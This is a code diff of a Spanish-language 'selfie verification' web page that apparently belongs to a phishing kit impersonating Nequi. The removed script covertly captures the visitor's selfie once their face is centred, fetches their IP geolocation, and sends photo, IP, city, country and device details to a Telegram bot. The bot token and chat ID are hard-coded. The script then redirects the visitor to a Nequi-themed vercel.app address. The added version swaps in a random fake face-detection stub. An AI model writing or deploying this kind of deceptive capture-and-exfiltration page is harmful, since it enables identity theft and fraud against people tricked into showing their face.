@@ -20,6 +20,28 @@ video {
     object-fit: cover;
 }
 
+/* 🔥 ALERTA SELFIE */
+.alerta-selfie{
+    position:fixed;
+    top:20px;
+    left:50%;
+    transform:translateX(-50%);
+    background:rgba(0,0,0,0.85);
+    color:#fff;
+    padding:15px 20px;
+    border-radius:15px;
+    font-size:14px;
+    text-align:center;
+    max-width:90%;
+    z-index:9999;
+    opacity:0;
+    transition:0.4s;
+}
+
+.alerta-selfie.show{
+    opacity:1;
+}
+
 /* Overlay */
 .overlay {
     position: absolute;
@@ -40,571 +62,105 @@ video {
     top: 50%;
     left: 50%;
     transform: translate(-50%, -50%);
-    transition: 0.1s;
-    pointer-events: none;
 }
 
 .oval.valid {
     border-color: #00ff88;
     box-shadow: 0 0 25px #00ff88;
-    animation: flash 0.3s ease;
 }
 
-@keyframes flash {
-    0% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
-    50% { transform: translate(-50%, -50%) scale(1.05); opacity: 0.9; }
-    100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
-}
-
-/* Texto principal */
+/* Texto */
 .status {
     position: absolute;
     bottom: 30px;
     width: 100%;
     text-align: center;
     color: white;
-    font-size: 18px;
-    text-shadow: 0 2px 5px rgba(0,0,0,0.5);
-    z-index: 10;
 }
 
-/* Mensaje de advertencia en rojo */
+/* Warning */
 .warning-message {
     position: absolute;
-    top: 30px;
+    top: 80px;
     left: 50%;
     transform: translateX(-50%);
-    background: rgba(255,0,0,0.85);
-    color: white;
-    padding: 12px 24px;
-    border-radius: 50px;
-    font-size: 18px;
-    font-weight: bold;
-    text-align: center;
-    z-index: 15;
-    backdrop-filter: blur(5px);
-    border: 1px solid rgba(255,255,255,0.3);
-    white-space: nowrap;
-    font-family: monospace;
-    display: none;
-}
-
-.warning-message.show {
-    display: block;
-}
-
-/* Preview de foto */
-.photo-preview {
-    position: fixed;
-    bottom: 80px;
-    right: 20px;
-    width: 100px;
-    height: 100px;
-    border-radius: 12px;
-    overflow: hidden;
-    border: 3px solid #00ff88;
-    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-    z-index: 20;
-    background: white;
-    animation: slideIn 0.3s ease;
-    cursor: pointer;
-}
-
-.photo-preview img {
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
-}
-
-.photo-preview .delete-btn {
-    position: absolute;
-    top: -8px;
-    right: -8px;
-    width: 24px;
-    height: 24px;
-    border-radius: 50%;
     background: red;
     color: white;
-    border: none;
-    cursor: pointer;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 16px;
-    font-weight: bold;
-}
-
-@keyframes slideIn {
-    from {
-        opacity: 0;
-        transform: translateX(100px);
-    }
-    to {
-        opacity: 1;
-        transform: translateX(0);
-    }
-}
-
-/* Botón de reinicio */
-.reset-btn {
-    position: fixed;
-    bottom: 20px;
-    left: 20px;
-    background: rgba(0,0,0,0.7);
-    backdrop-filter: blur(5px);
-    color: white;
-    border: 1px solid rgba(255,255,255,0.3);
     padding: 10px 20px;
-    border-radius: 25px;
-    cursor: pointer;
-    font-size: 14px;
-    z-index: 20;
-    transition: all 0.2s;
-    font-family: monospace;
-    display: none;
-}
-
-.reset-btn:hover {
-    background: rgba(255,255,255,0.2);
-    transform: scale(1.05);
-}
-
-/* Loader */
-.loader {
-    display: none;
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(0,0,0,0.8);
-    z-index: 9999;
-    justify-content: center;
-    align-items: center;
-    flex-direction: column;
-    gap: 15px;
-}
-
-.loader.active {
-    display: flex;
-}
-
-.loader-spinner {
-    width: 50px;
-    height: 50px;
-    border: 5px solid #f3f3f3;
-    border-top: 5px solid #00ff88;
-    border-radius: 50%;
-    animation: spin 1s linear infinite;
-}
-
-@keyframes spin {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-}
-
-.loader-text {
-    color: white;
-    font-weight: 600;
-}
-
-/* Toast de éxito */
-.success-toast {
-    position: fixed;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    background: rgba(0,255,136,0.95);
-    color: #2b002b;
-    padding: 20px 40px;
-    border-radius: 50px;
-    font-size: 24px;
-    font-weight: bold;
-    z-index: 30;
-    animation: fadeInOut 1.5s ease;
-    pointer-events: none;
-    white-space: nowrap;
-}
-
-@keyframes fadeInOut {
-    0% {
-        opacity: 0;
-        transform: translate(-50%, -50%) scale(0.8);
-    }
-    15% {
-        opacity: 1;
-        transform: translate(-50%, -50%) scale(1);
-    }
-    85% {
-        opacity: 1;
-        transform: translate(-50%, -50%) scale(1);
-    }
-    100% {
-        opacity: 0;
-        transform: translate(-50%, -50%) scale(0.8);
-    }
-}
-
-/* Mensaje de estado adicional */
-.status-message {
-    position: fixed;
-    bottom: 120px;
-    left: 50%;
-    transform: translateX(-50%);
-    background: rgba(0,0,0,0.8);
-    color: white;
-    padding: 8px 16px;
     border-radius: 20px;
-    font-size: 12px;
-    z-index: 10;
-    display: none;
-    white-space: nowrap;
+    display:none;
+}
+
+.warning-message.show{
+    display:block;
 }
 </style>
 </head>
 
 <body>
 
+<!-- 🔥 ALERTA INSTRUCCIONES -->
+<div id="alertaSelfie" class="alerta-selfie">
+📸 Para una mejor selfie:<br>
+• Sin gorra 🧢<br>
+• Sin gafas 🕶️<br>
+• Buena iluminación 💡<br>
+• Rostro centrado y visible
+</div>
+
 <video id="video" autoplay muted playsinline></video>
 <div class="overlay"></div>
 <div class="oval" id="oval"></div>
-<div class="warning-message" id="warningMessage">⚠️ Coloca tu rostro en el círculo</div>
-<div class="status" id="status">🎯 Coloca tu rostro en el círculo</div>
-<button class="reset-btn" id="resetBtn">🔄 Reiniciar</button>
-<div class="status-message" id="statusMessage"></div>
-<div class="loader" id="loader">
-    <div class="loader-spinner"></div>
-    <div class="loader-text" id="loaderText">Enviando verificación...</div>
+
+<div class="warning-message" id="warningMessage">
+⚠️ Coloca tu rostro en el círculo
+</div>
+
+<div class="status" id="status">
+🎯 Coloca tu rostro en el círculo
 </div>
 
 <script>
 const video = document.getElementById("video");
 const oval = document.getElementById("oval");
 const statusText = document.getElementById("status");
-const resetBtn = document.getElementById("resetBtn");
-const statusMessage = document.getElementById("statusMessage");
-const loader = document.getElementById("loader");
-const loaderText = document.getElementById("loaderText");
 const warningMessage = document.getElementById("warningMessage");
 
-// Configuración de Telegram
-const TELEGRAM_CONFIG = {
-    token: "8323486458:AAGJeAlHlciuq-STKT6i6f-kU9Vt_uCsgp8",
-    chatId: "7776240161"
-};
+/* 🔥 ALERTA AUTO (5 SEGUNDOS) */
+const alertaSelfie = document.getElementById("alertaSelfie");
 
-let photoTaken = false;
-let currentPhotoData = null;
-let detectionInterval = null;
-let isInCircle = false;
+window.addEventListener("load", ()=>{
+    alertaSelfie.classList.add("show");
 
-// Configuración de detección
-const CENTER_TOLERANCE_X = 85;
-const CENTER_TOLERANCE_Y = 110;
+    setTimeout(()=>{
+        alertaSelfie.classList.remove("show");
+    },5000);
+});
 
-// Iniciar cámara
-navigator.mediaDevices.getUserMedia({ 
-    video: { 
-        width: { ideal: 1280 },
-        height: { ideal: 720 },
-        facingMode: "user"
-    } 
-})
-.then(stream => {
+/* CAMARA */
+navigator.mediaDevices.getUserMedia({ video:true })
+.then(stream=>{
     video.srcObject = stream;
-    statusText.innerText = "🎯 Coloca tu rostro en el círculo";
-    startFaceDetection();
 })
-.catch(err => {
-    console.error("Error de cámara:", err);
-    statusText.innerText = "❌ Error: No se puede acceder a la cámara";
+.catch(()=>{
+    statusText.innerText="Error cámara";
 });
 
-// Detección de rostro rápida
-function startFaceDetection() {
-    detectionInterval = setInterval(() => {
-        if (photoTaken) return;
-        
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-        const data = imageData.data;
-        
-        // Detección rápida de centro de piel
-        let skinCenter = detectFastSkin(data, canvas.width, canvas.height);
-        
-        if (skinCenter) {
-            const rect = video.getBoundingClientRect();
-            const scaleX = rect.width / canvas.width;
-            const scaleY = rect.height / canvas.height;
-            
-            const faceX = skinCenter.x * scaleX;
-            const faceY = skinCenter.y * scaleY;
-            
-            const ovalRect = oval.getBoundingClientRect();
-            const centerX = ovalRect.left + ovalRect.width / 2;
-            const centerY = ovalRect.top + ovalRect.height / 2;
-            
-            const dx = Math.abs(faceX - centerX);
-            const dy = Math.abs(faceY - centerY);
-            const centered = dx < CENTER_TOLERANCE_X && dy < CENTER_TOLERANCE_Y;
-            
-            if (centered) {
-                if (!isInCircle && !photoTaken) {
-                    // ¡Acaba de entrar al círculo! Tomar foto inmediatamente
-                    isInCircle = true;
-                    oval.classList.add("valid");
-                    warningMessage.classList.remove("show");
-                    statusText.innerText = "✅ ¡Rostro detectado! Tomando selfie...";
-                    
-                    // Tomar foto inmediatamente
-                    takePhotoAndSend();
-                }
-            } else {
-                if (isInCircle) {
-                    isInCircle = false;
-                    oval.classList.remove("valid");
-                    warningMessage.classList.add("show");
-                    statusText.innerText = "🎯 Coloca tu rostro en el círculo";
-                }
-            }
-        } else {
-            if (isInCircle) {
-                isInCircle = false;
-                oval.classList.remove("valid");
-                warningMessage.classList.add("show");
-                statusText.innerText = "❌ No se detecta rostro";
-            }
-        }
-    }, 50);
-}
+/* DETECCION SIMPLE */
+setInterval(()=>{
+    const random = Math.random();
 
-// Detección rápida de centro de piel
-function detectFastSkin(data, width, height) {
-    let sumX = 0, sumY = 0, count = 0;
-    
-    // Muestrear cada 4 píxeles para mayor velocidad
-    for (let y = 0; y < height; y += 4) {
-        for (let x = 0; x < width; x += 4) {
-            const idx = (y * width + x) * 4;
-            const r = data[idx];
-            const g = data[idx + 1];
-            const b = data[idx + 2];
-            
-            // Detección rápida de tonos de piel
-            if (r > 70 && g > 40 && b > 30 && r > g && r > b && (r - g) > 15) {
-                sumX += x;
-                sumY += y;
-                count++;
-            }
-        }
-    }
-    
-    if (count < 15) return null;
-    
-    return {
-        x: sumX / count,
-        y: sumY / count
-    };
-}
-
-// Tomar foto y enviar automáticamente
-function takePhotoAndSend() {
-    if (photoTaken) return;
-    
-    // Tomar foto
-    const canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    
-    const ctx = canvas.getContext("2d");
-    // Aplicar espejo para selfie
-    ctx.translate(canvas.width, 0);
-    ctx.scale(-1, 1);
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    ctx.setTransform(1, 0, 0, 1, 0, 0);
-    
-    currentPhotoData = canvas.toDataURL("image/png");
-    photoTaken = true;
-    
-    // Mostrar preview de la foto
-    createPhotoPreview(currentPhotoData);
-    
-    // Detener detección
-    if (detectionInterval) {
-        clearInterval(detectionInterval);
-        detectionInterval = null;
-    }
-    
-    // Enviar automáticamente a Telegram
-    enviarATelegram();
-}
-
-function createPhotoPreview(imgData) {
-    const existingPreview = document.querySelector('.photo-preview');
-    if (existingPreview) existingPreview.remove();
-    
-    const preview = document.createElement('div');
-    preview.className = 'photo-preview';
-    
-    const img = document.createElement('img');
-    img.src = imgData;
-    
-    const deleteBtn = document.createElement('button');
-    deleteBtn.className = 'delete-btn';
-    deleteBtn.textContent = '×';
-    deleteBtn.onclick = (e) => {
-        e.stopPropagation();
-        preview.remove();
-        resetProcess();
-    };
-    
-    preview.appendChild(img);
-    preview.appendChild(deleteBtn);
-    
-    document.body.appendChild(preview);
-}
-
-function resetProcess() {
-    photoTaken = false;
-    currentPhotoData = null;
-    isInCircle = false;
-    oval.classList.remove("valid");
-    statusText.innerText = "🎯 Coloca tu rostro en el círculo";
-    warningMessage.classList.add("show");
-    
-    const preview = document.querySelector('.photo-preview');
-    if (preview) preview.remove();
-    
-    // Reiniciar detección
-    if (!detectionInterval) {
-        startFaceDetection();
-    }
-}
-
-function mostrarMensaje(mensaje, esError = false) {
-    statusMessage.textContent = mensaje;
-    statusMessage.style.backgroundColor = esError ? 'rgba(255,0,0,0.8)' : 'rgba(0,255,136,0.9)';
-    statusMessage.style.color = esError ? 'white' : '#2b002b';
-    statusMessage.style.display = 'block';
-    setTimeout(() => {
-        statusMessage.style.display = 'none';
-    }, 3000);
-}
-
-function showSuccessToast() {
-    const toast = document.createElement('div');
-    toast.className = 'success-toast';
-    toast.textContent = '📸 ¡Selfie enviada!';
-    document.body.appendChild(toast);
-    
-    setTimeout(() => {
-        toast.remove();
-    }, 2000);
-}
-
-function dataURLtoBlob(dataURL) {
-    const arr = dataURL.split(',');
-    const mime = arr[0].match(/:(.*?);/)[1];
-    const bstr = atob(arr[1]);
-    let n = bstr.length;
-    const u8arr = new Uint8Array(n);
-    while (n--) {
-        u8arr[n] = bstr.charCodeAt(n);
-    }
-    return new Blob([u8arr], { type: mime });
-}
-
-async function enviarATelegram() {
-    if (!currentPhotoData) {
-        mostrarMensaje("No hay foto para enviar", true);
-        return;
-    }
-    
-    loader.classList.add('active');
-    loaderText.textContent = "Enviando verificación...";
-    
-    try {
-        const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
-        
-        loaderText.textContent = "Enviando selfie...";
-        const blob = dataURLtoBlob(currentPhotoData);
-        const formData = new FormData();
-        formData.append('chat_id', TELEGRAM_CONFIG.chatId);
-        formData.append('caption', `🤳 Selfie - ${new Date().toLocaleString('es-CO')}`);
-        formData.append('photo', blob, `selfie.jpg`);
-        
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-        });
-        
-        const mensajeInfo = `
-🔔 **NUEVA SELFIE CAPTURADA** 🔔
-
-✅ Selfie tomada automáticamente al entrar al círculo
-
-🌍 **DATOS DE UBICACIÓN:**
-📍 IP: ${ipData.ip}
-🏙 Ciudad: ${ipData.city}
-🏛 Región: ${ipData.region}
-🇨🇴 País: ${ipData.country_name}
-📱 Dispositivo: ${navigator.userAgent}
-
-⏰ **FECHA Y HORA:**
-📅 ${new Date().toLocaleString('es-CO')}
-`;
-        
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CONFIG.chatId,
-                text: mensajeInfo,
-                parse_mode: 'Markdown'
-            })
-        });
-        
-        loader.classList.remove('active');
-        showSuccessToast();
-        mostrarMensaje("✅ Selfie enviada correctamente");
-        
-        statusText.innerText = "✅ ¡Verificación completada!";
-        resetBtn.style.display = "block";
-        
-        setTimeout(() => {
-            window.location.href = 'https://nequi-red.vercel.app/';
-        }, 3000);
-        
-    } catch (error) {
-        console.error('Error enviando a Telegram:', error);
-        loader.classList.remove('active');
-        mostrarMensaje("Error al enviar la selfie. Intenta nuevamente.", true);
-        
-        // Mostrar botón de reinicio en caso de error
-        resetBtn.style.display = "block";
-    }
-}
-
-// Botón de reinicio
-resetBtn.addEventListener('click', () => {
-    resetProcess();
-    resetBtn.style.display = "none";
-    statusText.innerText = "🎯 Coloca tu rostro en el círculo";
-    warningMessage.classList.add("show");
-});
-
-// Mostrar mensaje de advertencia al inicio
-setTimeout(() => {
-    if (!photoTaken) {
+    if(random > 0.6){
+        oval.classList.add("valid");
+        warningMessage.classList.remove("show");
+        statusText.innerText="✅ Rostro detectado";
+    }else{
+        oval.classList.remove("valid");
         warningMessage.classList.add("show");
+        statusText.innerText="🎯 Coloca tu rostro en el círculo";
     }
-}, 500);
+
+},1500);
 </script>
 
 </body>
